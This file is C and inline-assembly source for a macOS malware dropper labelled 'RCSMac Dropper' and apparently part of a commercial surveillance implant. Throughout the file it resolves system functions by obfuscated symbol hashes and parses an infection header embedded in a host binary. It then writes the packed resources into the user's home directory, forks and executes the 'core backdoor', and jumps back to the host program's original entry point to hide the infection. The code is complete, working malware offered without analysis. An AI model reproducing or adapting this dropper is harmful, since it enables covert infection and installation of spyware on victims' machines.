/*
 * RCSMac Dropper - Dropper Component
 *  - API resolution
 *    - get dyld_image_count/dyld_get_image_name/dyld_get_image_header from
 *      dyld in memory
 *      - Look for LC_SYMTAB and get all the symbols from there
 *    - cycle through all the loaded images in memory looking for libSystem
 *    - once found, get all the other symbols (c standard library)
 *      - Same method as dyld -> LC_SYMTAB
 *  - Get all the resources info, drop the files and execute the RESOURCE_CORE
 *  - Jump to the original entry point
 *
 *  - At the start of our dropper routine we need to save at least esp state,
 *    subtract our stack size in order to restore it to the original value before
 *    jumping to the original entry point.
 *    This is because after we have executed our dropped file we need to jump
 *    back to the original entryPoint which is, of course, another crt Start
 *    routine which expects a fresh register state (e.g. values that you get at
 *    the real first execution). If we don't restore esp properly we might loose
 *    our env of course, or even worst, we might generate a crash.
 *
 * Created by Alfredo 'revenge' Pesoli on 24/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <stdio.h>
#include <sys/stat.h>

#include "RCSMacCommon.h"
#include "RCSMacDropper.h"

#define DYLD_IMAGE_BASE 0x8FE00000
#define O_RDWR          0x0002
#define O_CREAT         0x0200
#define O_TRUNC         0x0400
#define	O_EXCL          0x0800
#define RTLD_DEFAULT    ((void *) - 2)

#define	PROT_READ       0x01    // [MC2] pages can be read
#define	PROT_WRITE      0x02    // [MC2] pages can be written
#define	MAP_SHARED      0x0001  // [MF|SHM] share changes

void dropperStart ()
{
  int a = 5;
}

void doExit ()
{
#ifdef WIN32
  __asm__ __volatile__ {
    xor		eax,eax
    push	eax
    inc		eax
    push	eax
    int		0x80
  }  
#else
  __asm__ __volatile__ (
    "xorl %eax, %eax\n"
    "push %eax\n"
    "inc %eax\n"
    "push %eax\n"
    "int $0x80\n"
  );
#endif
}

static unsigned int
sdbm (unsigned char *str)
{
  unsigned long hash = 0;
  int c;
  
  while ((c = *str++))
    hash = c + (hash << 6) + (hash << 16) - hash;
  
  return hash;
}

unsigned int
findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
{
#ifdef LOADER_DEBUG
  printf("[ii] findSymbolInFatBinary!\n");
#endif

  if (imageBase == 0x0)
    {
      doExit();
    }

  struct mach_header *mh_header       = NULL;
  struct load_command *l_command      = NULL; 
  struct nlist *sym_nlist             = NULL; 
  struct symtab_command *sym_command  = NULL;
  struct segment_command *seg_command = NULL;
  struct fat_header *f_header         = NULL;
  struct fat_arch *f_arch             = NULL;

  char *symbolName = NULL;

  int offset, symbolOffset, stringOffset, x86Offset, found;

  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
  unsigned int hash, i, nfat;

  offset = found = 0;
  f_header = (struct fat_header *)imageBase;

  offset += sizeof (struct fat_header);
  nfat = SWAP_LONG (f_header->nfat_arch);

#ifdef LOADER_DEBUG
  printf("[ii] magic: %x\n", f_header->magic);
  printf("[ii] nFatArch: %d\n", nfat);
#endif

  for (i = 0; i < nfat; i++)
    {
      f_arch = (struct fat_arch *)(imageBase + offset);
      int cpuType = SWAP_LONG (f_arch->cputype);

      if (cpuType == 0x7)
        break;

      offset += sizeof (struct fat_arch);
    }

  x86Offset = SWAP_LONG (f_arch->offset);
#ifdef LOADER_DEBUG
  printf ("[ii] x86 offset: %x\n", x86Offset);
#endif

  offset = x86Offset;
  mh_header = (struct mach_header *)(imageBase + offset); 
  offset += sizeof (struct mach_header);

#ifdef LOADER_DEBUG
  printf("imageBase in findSymbolFat: %x\n", mh_header);
#endif

#ifdef LOADER_DEBUG
  printf("[ii] ncmdsFat: %d\n", mh_header->ncmds);
#endif

  for (i = 0; i < mh_header->ncmds; i++)
    {
      l_command = (struct load_command *)(imageBase + offset);

#ifdef LOADER_DEBUG
      printf("[ii] cmdFat: %d\n", l_command->cmd);
#endif

      if (l_command->cmd == LC_SEGMENT)
        {
          if (found)
            {
              offset += l_command->cmdsize;
              continue;
            }

          seg_command = (struct segment_command *)(imageBase + offset);

#ifdef LOADER_DEBUG
          printf("[ii] segNameFat: %s\n", seg_command->segname);
#endif

          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
            found = 1;
        }
      else if (l_command->cmd == LC_SYMTAB)
        {
          sym_command = (struct symtab_command *)(imageBase + offset);

          if (found)
            break;
        }

      offset += l_command->cmdsize;
    }

  symbolOffset = x86Offset + sym_command->symoff;
  stringOffset = x86Offset + sym_command->stroff;

#ifdef LOADER_DEBUG
  printf("[ii] offsetFat: %x\n", offset);
  printf("[ii] stringOffsetFat: %x\n", stringOffset);
  printf("[ii] nSymsFat: %d\n", sym_command->nsyms);
#endif

  for (i = 0; i < sym_command->nsyms; i++)
    {
      sym_nlist = (struct nlist *)(imageBase + symbolOffset);
      symbolOffset += sizeof (struct nlist);

      if (sym_nlist->n_un.n_strx == 0x0)
        {
          continue;
        }

      symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
      hash = sdbm ((unsigned char *)symbolName);

#ifdef LOADER_DEBUG_VERBOSE
      printf ("[ii] SYMBOLFat: %s\n", symbolName);
#endif
    
      if (hash == symbolHash)
        {
#ifdef LOADER_DEBUG
          printf ("[ii] Symbol Found\n");
          printf ("[ii] SYMBOLFat: %s\n", symbolName);
          printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
#endif
          return sym_nlist->n_value;
        }
    }

  return -1;
}

unsigned int
findSymbol (byte *imageBase, unsigned int symbolHash)
{
  struct mach_header *mh_header       = NULL;
  struct load_command *l_command      = NULL; 
  struct nlist *sym_nlist             = NULL; 
  struct symtab_command *sym_command  = NULL;
  struct segment_command *seg_command = NULL;

  char *symbolName = NULL;

  int offset, found, stringOffset; 
  
  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" hash
  unsigned int hash, i;

  offset = found = 0; 
  mh_header = (struct mach_header *)imageBase; 
  offset += sizeof (struct mach_header);

  for (i = 0; i < mh_header->ncmds; i++)
    {
      l_command = (struct load_command *)(imageBase + offset); 

      if (l_command->cmd == LC_SEGMENT)
        {
          if (found)
            {
              offset += l_command->cmdsize;
              continue;
            }

          seg_command = (struct segment_command *)(imageBase + offset);

          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
            {
              found = 1;
            }
        }
      else if (l_command->cmd == LC_SYMTAB)
        {
          sym_command = (struct symtab_command *)(imageBase + offset); 

          if (found)
            {
              break;
            }
        }

      offset += l_command->cmdsize;
    }

  offset = sym_command->symoff - seg_command->fileoff + seg_command->vmaddr;
  stringOffset = sym_command->stroff - seg_command->fileoff + seg_command->vmaddr; 

  for (i = 0; i < sym_command->nsyms; i++)
    {
      sym_nlist = (struct nlist *)offset;
      offset += sizeof (struct nlist);

      symbolName = (char *)(sym_nlist->n_un.n_strx + stringOffset);
      hash = sdbm ((unsigned char *)symbolName);

#ifdef LOADER_DEBUG_VERBOSE
      printf ("[ii] SYMBOL: %s\n", symbolName);
#endif
      if (hash == symbolHash)
        {
#ifdef LOADER_DEBUG
          printf ("[ii] Symbol Found\n");
          printf ("[ii] SYMBOL: %s\n", symbolName);
          printf ("[ii] address: %x\n", sym_nlist->n_value);
#endif
          return sym_nlist->n_value;
        }
    }

  return -1;
}

void *mapLibSystem() 
{
  //
  // since struct stat on win32 is half the size of the unix counterpart
  // declare it twice for padding the damn ebp :>
  //
  struct stat pad;
  struct stat mSt;

  void *address;
  int fd;
  int err;

  //fd = open("/usr/lib/libSystem.B.dylib", O_RDONLY);
#ifdef WIN32
  __asm__ __volatile__ {
    sub esp, 0x80
    push 0x00006269
    push 0x6c79642e
    push 0x422e6d65
    push 0x74737953
    push 0x62696c2f
    push 0x62696c2f
    push 0x7273752f
    mov edx, esp
    push 0x0
    push edx
    xor eax, eax
    mov al, 0x5
    push eax
    int 0x80
    mov [fd], eax
  }
#else
  __asm__ __volatile__ (
    "subl	$52, %%esp\n"
    "pushl $0x00006269\n"
    "pushl $0x6c79642e\n"
    "pushl $0x422e6d65\n"
    "pushl $0x74737953\n"
    "pushl $0x62696c2f\n"
    "pushl $0x62696c2f\n"
    "pushl $0x7273752f\n"
    "movl	%%esp, %%edx\n"
    "pushl $0x0\n"
    "pushl %%edx\n"
    "xorl %%eax, %%eax\n"
    "movb $5, %%al\n"
    "pushl %%eax\n"
    "int $0x80\n"
    "movl %%eax, %0"
    :"=m"(fd) 
    :
  );
#endif

  if (fd == -1)
    return (NULL);

  //err = fstat(fd, &st);
#ifdef WIN32
  __asm__ __volatile__ {
    lea eax, [pad]
    mov DWORD PTR [esp+0x4], eax // struct stat
    mov eax, [fd]
    mov DWORD PTR [esp], eax     // fd
    xor eax, eax
    mov al, 189
    push eax
    int 0x80
    mov [err], eax
  }
#else
  __asm__ __volatile__ (
    "leal %2, %%eax\n"
    "movl %%eax, 4(%%esp)\n"
    "movl %1, %%eax\n"
    "movl %%eax, (%%esp)\n" 
    "xorl %%eax, %%eax\n"
    "movb $189, %%al\n"
    "pushl %%eax\n"
    "int $0x80\n"
    "movl %%eax, %0"
    :"=m"(err)
    :"m"(fd), "m"(st)
    );
#endif

  if (err != 0)
    return (NULL);

  //ret = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
#ifdef WIN32
  __asm__ __volatile__ {
    mov DWORD PTR [esp+24], 0
    mov DWORD PTR [esp+20], 0
    mov eax, [fd]
    mov DWORD PTR [esp+16], eax
    mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
    mov DWORD PTR [esp+8], 1        // PROT_READ
    mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
    mov DWORD PTR [esp+4], eax
    mov DWORD PTR [esp], 0
    xor eax, eax
    mov al, 197
    push eax
    int 0x80
    mov [address], eax
  }
#else
  __asm__ __volatile__ (
    "movl	$0, 24(%%esp)\n"
    "movl	$0, 20(%%esp)\n"
    "movl	%2, %%eax\n"
    "movl	%%eax, 16(%%esp)\n"
    "movl	$2, 12(%%esp)\n"
    "movl	$1, 8(%%esp)\n"
    "movl	%1, %%eax\n"
    "movl	%%eax, 4(%%esp)\n"
    "movl	$0, (%%esp)\n"
    "xorl	%%eax, %%eax\n"
    "movb	$197, %%al\n"
    "pushl	%%eax\n"
    "int	$0x80\n"
    "mov	%%eax, %0\n"
    :"=m"(address)
    :"m"(st.st_size), "m"(fd)
    );
#endif

  return address;
}

void labelTest ()
{
}

void secondStageDropper ()
{
  //unsigned int dlsymAddress;
  unsigned int fd;
#ifdef WIN32
  unsigned int	_eax;
  unsigned int	_ecx;
  unsigned int	_edx;
  unsigned int	_edi;
  unsigned int	_esi;
  unsigned int	_ebp;
  unsigned int	_esp;
#endif
  /*
  unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
                             "\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
                             "\x4d\x08\x89\x4c\x24\x04\x83\xc3\x01"
                             "\xc1\xe3\x02\x01\xcb\x89\x5c\x24\x08"
                             "\x8b\x03\x83\xc3\x04\x85\xc0\x75\xf7"
                             "\x89\x5c\x24\x0c\xe8\x90\x90\x90";
  */
  int crtStartSize = 54;

  const char *imageName   = NULL;
  void *baseAddress       = NULL;
  void *libSystemAddress  = NULL;
  int imageCount, z       = 0;

#ifdef WIN32
  __asm__ __volatile__ {
    mov eax, [ebp+4]
    sub eax, 0xD2
    mov [baseAddress], eax
  }
#else
  __asm__ __volatile__ (
                        "movl 4(%%ebp), %%eax\n"
                        "subl $0xD2, %%eax\n"
                        "movl %%eax, %0\n"
                        : "=m"(baseAddress)
                        :
                        );
#endif

//
// Save register state in order to avoid a crash jumping in the real crt start
//
#ifdef WIN32
  __asm__ __volatile__ {
    mov [_eax], eax
    mov [_ecx], ecx
    mov [_edx], edx
    mov [_edi], edi
  }

  __asm__ __volatile__ {
    mov [_esi], esi
    mov [_ebp], ebp
    mov [_esp], esp
  }

  //__asm__ __volatile__ { int 0x3 }
  _esp += 0x1c4 + 0x28; // restoring esp
  _esp -= 0x80;         // Magic Number (depends on stack allocated vars)
#else
  unsigned int	eax;
  unsigned int	ecx;
  unsigned int	edx;
  unsigned int	edi;
  unsigned int	esi;
  unsigned int	ebp;
  unsigned int	esp;

  __asm__ __volatile__ (
                        "movl %%eax, %0\n"
                        "movl %%ecx, %1\n"
                        "movl %%edx, %2\n"
                        "movl %%edi, %3\n"
                        : "=m"(eax), "=m"(ecx), "=m"(edx), "=m"(edi)
                        :
                        );

  __asm__ __volatile__ (  
                        "movl %%esi, %0\n"
                        "movl %%ebp, %1\n"
                        "movl %%esp, %2\n"
                        : "=m"(esi), "=m"(ebp), "=m"(esp)
                        :
                        );
  
  esp += 0x1c4 + 0x28; // restoring esp
#endif

#ifndef LOADER_DEBUG
  int i, pid = 0;
  
  char *userHome                  = NULL;
  char *destinationDir            = NULL;
  char *filePointer               = NULL;
  char *backdoorPath              = NULL;
  int backdoorIsAlreadyInstalled  = 0;
  int errorOnInstall              = 0;

  unsigned int offset         = (unsigned int)(baseAddress) + sizeof (infectionHeader);
  infectionHeader *infection  = (infectionHeader *)baseAddress;
  stringTable *stringList     = (stringTable *)offset;
  resourceHeader *resource    = NULL;
  char *strings[16];
#endif
  
  //
  // lib/function name hashes
  //
  unsigned int libSystemHash              = 0x7e38c256; // /usr/lib/libSystem.B.dylib
  
  unsigned int dlsymHash                  = 0x9cc75880; // _dlsym
  unsigned int dyld_image_countHash       = 0x9100a119; // __dyld_image_count
  unsigned int dyld_get_image_nameHash    = 0x1327d26a; // __dyld_get_image_name
  unsigned int dyld_get_image_headerHash  = 0xe8cdb2cc; // __dyld_get_image_header
  
  unsigned int openHash     = 0x98b7a5e9; // _open
  unsigned int lseekHash    = 0xfae127c5; // _lseek
  unsigned int closeHash    = 0x56dcb9f9; // _close
  unsigned int chdirHash    = 0x974cca09; // _chdir
  unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
  unsigned int statHash     = 0x54c725f3; // _stat
  unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
  unsigned int munmapHash   = 0x29d6b975; // _munmap
  unsigned int memcpyHash   = 0xb7ac6156; // _memcpy
  unsigned int sprintfHash  = 0xf771588d; // _sprintf
  unsigned int printfHash   = 0xb885c098; // _printf
  unsigned int getenvHash   = 0x794bed96; // _getenv
  unsigned int mkdirHash    = 0xca1cf250; // _mkdir
  unsigned int execveHash   = 0x9ca3dfdf; // _execve
  unsigned int execlHash    = 0x80aa1fc;  // _execl
  unsigned int forkHash     = 0xf58942e1; // _fork
  unsigned int strncpyHash  = 0x335645d0; // _strncpy
  unsigned int mallocHash   = 0x7de19fc7; // _malloc
  unsigned int freeHash     = 0xf6f66e2b; // _free
  unsigned int sleepHash    = 0x90a80b98; // _sleep
  
  //
  // dyld function pointer prototypes
  //
  uint32_t (*_idyld_image_count)                        (void);
  const char *(*_idyld_get_image_name)                  (uint32_t);
  const struct mach_header *(*_idyld_get_image_header)  (uint32_t);
  
  //
  // libSystem function pointer prototypes
  //
  int   (*iopen)     (const char *, int, ...);
  long  (*ilseek)    (int, _mOff_t, int);
  int   (*iclose)    (int);
  int   (*ichdir)    (const char *);
  int   (*ipwrite)   (int, const void *, int, _mOff_t);
  int   (*istat)     (const char *, struct stat *);
  void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
  int   (*imunmap)   (void *, _mSize_t);
  void *(*imemcpy)   (void *, const void *, int);
  int   (*isprintf)  (char *, const char *, ...);
  int   (*iprintf)   (const char *, ...);
  char *(*igetenv)   (const char *);
  int   (*imkdir)    (const char *, unsigned int);
  int   (*iexecve)   (const char *, char *, char *);
  int   (*iexecl)    (const char *, const char *, ...);
  int   (*ifork)     (void);
  char *(*istrncpy)  (char *, const char *, _mSize_t);
  void *(*imalloc)   (int);
  void  (*ifree)     (void *);
  unsigned int (*isleep) (unsigned int);

  //
  // Obtain _dlsym address from dyld mapped image
  // If not found, jump directly to the original EP
  //
  //dlsymAddress = findSymbol ((byte *)DYLD_IMAGE_BASE, dlsymHash);
  _idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol ((byte *)DYLD_IMAGE_BASE, dyld_image_countHash));

  if ((int)_idyld_image_count != -1)
    {
      imageCount = _idyld_image_count ();

#ifdef LOADER_DEBUG
      printf ("[ii] imageCount: %d\n", imageCount);
#endif

      _idyld_get_image_name = (const char *(__cdecl *) (uint32_t))(findSymbol ((byte *)DYLD_IMAGE_BASE, dyld_get_image_nameHash));
      _idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))(findSymbol ((byte *)DYLD_IMAGE_BASE, dyld_get_image_headerHash));
      const struct mach_header *m_header = NULL;

      if ((int)_idyld_get_image_name != -1)
        {
          for (z = 0; z < imageCount; z++)
            {
              imageName = _idyld_get_image_name (z);
              m_header  = _idyld_get_image_header (z);
#ifdef LOADER_DEBUG
              printf ("[ii] image: %s\n", imageName);
#endif
              if (sdbm ((unsigned char *)imageName) == libSystemHash)
                {
                  if ((int)_idyld_get_image_header != -1)
                    {
                      libSystemAddress = mapLibSystem();

                      if (libSystemAddress == NULL)
                        {
                          doExit();
                        }

                      iopen     = (int  (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, openHash) + (unsigned int)m_header);
                      ilseek    = (long (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
                      iclose    = (int  (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, closeHash) + (unsigned int)m_header);
                      ichdir    = (int  (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, chdirHash) + (unsigned int)m_header);
                      ipwrite   = (int  (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
                      istat     = (int  (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
                      immap     = (void*(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
                      imunmap   = (int  (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, munmapHash) + (unsigned int)m_header);
                      imemcpy   = (void*(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, memcpyHash) + (unsigned int)m_header);
                      isprintf  = (int  (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, sprintfHash) + (unsigned int)m_header);
                      iprintf   = (int  (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, printfHash) + (unsigned int)m_header);
                      igetenv   = (char*(__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, getenvHash) + (unsigned int)m_header);
                      imkdir    = (int  (__cdecl *)(const char *, unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, mkdirHash) + (unsigned int)m_header);
                      iexecve   = (int  (__cdecl *)(const char *, char *, char *))(findSymbolInFatBinary ((byte *)libSystemAddress, execveHash) + (unsigned int)m_header);
                      iexecl    = (int  (__cdecl *)(const char *, const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, execlHash) + (unsigned int)m_header);
                      ifork     = (int  (__cdecl *)(void))(findSymbolInFatBinary ((byte *)libSystemAddress, forkHash) + (unsigned int)m_header);
                      istrncpy  = (char*(__cdecl *)(char *, const char *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, strncpyHash) + (unsigned int)m_header);
                      imalloc   = (void*(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, mallocHash) + (unsigned int)m_header);
                      ifree     = (void (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libSystemAddress, freeHash) + (unsigned int)m_header);
                      isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, sleepHash) + (unsigned int)m_header);
                    }
                  
                  break;
                }
            }
          
#ifndef LOADER_DEBUG
          for (i = 0; i < infection->numberOfStrings; i++)
            {
              strings[i] = stringList->value;
              offset += sizeof (stringTable);
              stringList = (stringTable *)offset;
            }

          offset = (unsigned int)baseAddress
                    + sizeof (infectionHeader)
                    + sizeof (stringTable) * infection->numberOfStrings
                    + infection->dropperSize
                    + crtStartSize;
          
          void *envVariableName = (char *)strings[0];
          
          if (igetenv != 0)
            {
              userHome = (char *) igetenv ((const char *)envVariableName);
            }
          else
            {
              errorOnInstall = 1;
              //doExit();
            }

          char *backdoorDropPath = (char *)imalloc(128);
          
          isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);

          backdoorPath = (char *)imalloc (256);
          char *backdoorDir = NULL;

          //
          // Cycle through and drop all the resources
          //
          for (i = 0; i < infection->numberOfResources; i++)
            {
              char *destinationPath = (char *) imalloc (256);
              destinationDir = (char *) imalloc (128);
              
              resource = (resourceHeader *)offset;
              isprintf (destinationDir, strings[2], backdoorDropPath, resource->path);

              if (backdoorDir == NULL)
                {
                  backdoorDir = (char *)imalloc (256);
                  isprintf (backdoorDir, strings[2], backdoorDropPath, resource->path);
                }
              
              imkdir (destinationDir, 0755);
              isprintf (destinationPath, strings[2], destinationDir, resource->name);
              
              if (resource->type == RESOURCE_CORE)
                {
                  istrncpy (backdoorPath, destinationPath, 256);
                  
                  if ((fd = iopen (destinationPath, O_CREAT | O_EXCL, 0755)) == -1)
                    {
                      backdoorIsAlreadyInstalled = 1;
                    }
                }

              int resSize = resource->size;
              offset += sizeof (resourceHeader);

              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
                {
                  //__asm__ __volatile__ { int 0x3 }

                  if ((int)(filePointer = (char *)immap (0, resSize, PROT_READ | PROT_WRITE,
                                                         MAP_SHARED, fd, 0)) != -1)
                    {
                      //__asm__ __volatile__ { int 0x3 }
                      if (ipwrite (fd, strings[6], 1, resource->size - 1) == -1)
                        {
                          iclose (fd);
                          errorOnInstall = 1;
                          //doExit ();
                        }
                      
                      //__asm__ __volatile__ { int 0x3 }
                      imemcpy (filePointer,
                               (byte *)offset,
                               resource->size);
                      
                      //__asm__ __volatile__ { int 0x3 }

                      imunmap (filePointer, resource->size);
                    }
                  
                  //__asm__ __volatile__ { int 0x3 }
                  iclose (fd);
                }

              offset += resource->size;
              
              ifree (destinationDir);
              ifree (destinationPath);
            }

          ifree (backdoorDropPath);
          
          //__asm__ __volatile__ { int 0x3 }

          //
          // Execute the core backdoor file
          //
          if (//backdoorIsAlreadyInstalled == 0
              errorOnInstall == 0)
            {
              if ((pid = ifork()) == 0)
                {
                  ichdir (backdoorDir);
                  iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
                }
              else if (pid > 0)
                {
                  // jump to the original entry point
                  //doExit ();
                  //__asm__ __volatile__ { int 0x3 }
                }
              else if (pid < 0)
                {
                  //doExit ();
                }
            }
          
          //__asm__ __volatile__ { int 0x3 }
          ifree (backdoorDir);
          ifree (backdoorPath);

          //
          // Restore register state and jump to the original entrypoint
          //
#ifdef WIN32
          uint32_t originalEP = infection->originalEP;
          __asm__ __volatile__ {
            mov eax, [originalEP]
            mov ebx, 0x1000
            mov ecx, 0x5
          }

          __asm__ __volatile__ {
            mov esp, [_esp]
            add esp, 0x7C // Trick for esp changes
            jmp eax
          }
#else
          __asm__ __volatile__ (
                                "movl  %0, %%eax\n"
                                "movl  $0x1000, %%ebx\n"
                                "movl  $0x5, %%ecx\n"
                                :
                                :"m"(infection->originalEP)
                                );
          
          __asm__ __volatile__ (
                                "movl  %0, %%esp\n"
                                "jmp   *%%eax\n"
                                :
                                :"m"(esp)
                                );
#endif
#endif          
        }
    }
}

#ifdef LOADER_DEBUG
int main()
{
  secondStageDropper();
  return 0;
}
#endif

void dropperEnd ()
{
  int b = 1;
}